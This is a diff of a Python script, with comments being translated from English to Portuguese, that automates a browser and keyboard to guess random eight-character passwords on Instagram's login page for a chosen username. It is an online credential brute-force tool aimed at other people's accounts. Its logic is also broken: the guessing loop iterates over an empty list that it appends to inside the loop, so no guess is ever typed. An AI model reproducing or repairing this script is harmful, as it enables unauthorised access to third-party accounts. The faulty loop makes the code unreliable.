@@ -6,21 +6,16 @@ import string
 
 username = input('Username: ')
 
-## control variables
+## Variáveis de controle
 web = Browser()
 keyboard = Controller()
 
-values = string.ascii_letters + string.digits ## + string.punctuation // just in last cases
-size = 8
+values = string.ascii_letters + string.digits ## letras e números
+size = 8            ### quantidade de caracteres que desejar na criação da senha
 
-senha = [] ### the return
-
-                        ### when the size it's over, the loop ends
-for i in range(size):
-    senha += choice(values)
 
 web.go_to('www.instagram.com')
-                        ### running bruteforce
+                        ### aqui começa o ataque
 time.sleep(5)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
@@ -32,7 +27,11 @@ web.type(username)
 keyboard.press(Key.tab)
 keyboard.release(Key.tab)
 
+senha = []
+
 for brute in senha:
+    for i in range(size):       ### o primeiro loop, cria uma senha do tamanho em que for definida a variável "size"
+        senha += choice(values)
     web.type(brute, into="Password")
     keyboard.press(Key.enter)
     keyboard.release(Key.enter)
